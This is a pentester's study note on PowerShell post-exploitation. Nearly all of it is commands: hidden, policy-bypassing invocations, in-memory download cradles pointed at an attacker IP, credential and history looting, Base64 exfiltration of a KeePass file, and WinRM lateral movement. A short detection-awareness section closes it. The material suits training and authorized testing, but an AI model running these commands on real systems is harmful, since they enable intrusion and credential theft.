# PowerShell

**Tags:** `#powershell` `#windows` `#commandline` `#postexploitation` `#downloadcradle` `#remoting` `#loot`

Windows' scripting shell and the default post-exploitation environment on any modern
Windows host — it's the Windows counterpart to [[Tools/Command Shell/Bash|Bash]]. On an
engagement it's how you run in-memory payloads, transfer files, enumerate the box, loot
credentials, and pivot over WinRM. This note is the operator survival + offensive subset;
AMSI/logging **evasion** lives in [[Techniques/AV & EDR Evasion|AV & EDR Evasion]], not here.

**Docs:** https://learn.microsoft.com/powershell/
**Install:** built into Windows (`powershell.exe`, Windows PowerShell 5.1); cross-platform
PowerShell 7 is `pwsh` (on Kali: `apt install powershell` → `pwsh`).

---

## Invocation Flags (what you'll paste after a foothold)

```powershell
powershell -nop -w hidden -ep bypass -c "<command>"
#  -nop / -NoProfile      don't load profile scripts (faster, quieter)
#  -w hidden              hidden window
#  -ep bypass             ExecutionPolicy is NOT a security boundary — this just skips it
#  -c / -Command          run a command;  -enc for a Base64 blob (below)
#  -noni / -NonInteractive
```

> [!note] **ExecutionPolicy is not security.** `Restricted` only stops *double-clicking* a
> `.ps1`; `-ep bypass`, piping to `iex`, or `-enc` all sidestep it. Never treat it as a control.

### Encoded command (`-enc`)

`-enc` takes Base64 of the **UTF-16LE** (Unicode) bytes — a classic mistake is encoding UTF-8.

```bash
# Build an -enc blob from Linux:
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/s.ps1")' \
  | iconv -t UTF-16LE | base64 -w0
```
```powershell
# Build it in PowerShell:
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
powershell -enc <blob>
```

---

## Download & Execute (cradles)

```powershell
# In-memory, nothing touches disk (the classic cradle)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')
iwr -UseBasicParsing http://10.10.14.5/s.ps1 | iex          # iwr = Invoke-WebRequest

# Download to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Windows\Temp\nc.exe')
iwr http://10.10.14.5/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

## File Transfer via Base64 (no network / clipboard exfil)

```bash
# On Kali: base64-encode a file to paste into a PS session
cat implant.exe | base64 -w 0 ; echo
```
```powershell
# In PowerShell: decode the Base64 string back to a file
[IO.File]::WriteAllBytes("C:\Windows\Temp\implant.exe",[Convert]::FromBase64String("<b64>"))

# Reverse direction — read a file OUT as Base64 to copy off a shell with no download path
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot\creds.kdbx"))
```

---

## Enumeration One-Liners

```powershell
whoami /all                                            # user, groups, privileges (SeImpersonate?)
Get-LocalUser ; Get-LocalGroupMember Administrators     # local accounts / admins
Get-NetIPAddress ; Get-DnsClientServerAddress           # networking
Get-Process ; Get-Service | ? {$_.Status -eq 'Running'}
Get-CimInstance Win32_OperatingSystem | fl              # OS/patch level (or systeminfo)
Get-ChildItem Env:                                      # env vars (creds/paths)
Get-ScheduledTask | ? {$_.State -eq 'Ready'}            # persistence/privesc surface
```

## Credential Hunting & Loot

```powershell
# Grep the filesystem for secrets
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt,unattend.xml -EA 0 |
  Select-String -Pattern 'password|pwd|secret|connectionstring' -EA 0

# PowerShell command history is CLEARTEXT and survives reboots — a top loot file:
Get-Content (Get-PSReadlineOption).HistorySavePath
#   default: %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Recover the plaintext from a stored PSCredential / SecureString
$c.GetNetworkCredential().Password
```

---

## Remoting (WinRM — lateral movement)

```powershell
$sec  = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\julio',$sec)

Enter-PSSession -ComputerName dc01 -Credential $cred                      # interactive shell
Invoke-Command -ComputerName dc01 -Credential $cred -ScriptBlock { whoami } # one-off / fan-out
Invoke-Command -ComputerName (gc hosts.txt) -Cred $cred -ScriptBlock {hostname}  # many hosts
```

Linux clients hit WinRM via [[Tools/Auth/Invoke-TheHash|Invoke-TheHash]] / `evil-winrm` / NetExec instead.

---

## Detection Footprint (know what you're tripping)

Not evasion — just awareness so you're not surprised in the report/IR debrief:

- **Script Block Logging** → event **4104** records the *decoded* script content (so `-enc` doesn't hide it).
- **Module logging** (4103) + **Transcription** write full command/output transcripts.
- **AMSI** scans script content at runtime before execution.
- **Constrained Language Mode (CLM)** restricts a session to safe cmdlets — check with
  `$ExecutionContext.SessionState.LanguageMode` (`FullLanguage` vs `ConstrainedLanguage`); it's
  a restricted-shell analog. Bypasses belong in [[Techniques/AV & EDR Evasion|AV & EDR Evasion]].

---

## Quick Reference

| Goal | Command |
|---|---|
| Run hidden, no profile, ignore policy | `powershell -nop -w hidden -ep bypass -c "…"` |
| Encoded command | `powershell -enc <UTF-16LE base64>` |
| In-memory download cradle | `IEX(New-Object Net.WebClient).DownloadString('http://IP/s.ps1')` |
| Download to disk | `iwr http://IP/f -OutFile C:\Windows\Temp\f` |
| Base64 → file | `[IO.File]::WriteAllBytes("out",[Convert]::FromBase64String("<b64>"))` |
| PS history (cleartext loot) | `gc (Get-PSReadlineOption).HistorySavePath` |
| Plaintext from PSCredential | `$c.GetNetworkCredential().Password` |
| Remote shell (WinRM) | `Enter-PSSession -ComputerName X -Credential $cred` |
| Fan-out command | `Invoke-Command -ComputerName X -Cred $cred -ScriptBlock {…}` |
| Language mode check | `$ExecutionContext.SessionState.LanguageMode` |

---

> [!note] **See also** — sibling note, same tool from the **scripting/post-ex** angle (multi-category placement, per DECISIONS D1): [[Tools/Scripting/Powershell|Tools/Scripting/PowerShell]] (download cradles, more file ops; also holds an older sonnet-authored AMSI-bypass section). The older Windows shell [[Tools/Command Shell/cmd.exe|cmd.exe]] (most injection/LOLBin contexts); the Linux counterpart [[Tools/Command Shell/Bash|Bash]]; reverse-shell
> one-liners + TTY upgrades in [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]];
> WinRM/PtH from Linux via [[Tools/Auth/Invoke-TheHash|Invoke-TheHash]] and [[Tools/Auth/mimikatz|mimikatz]]
> for the hashes; logging/AMSI **evasion** in [[Techniques/AV & EDR Evasion|AV & EDR Evasion]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
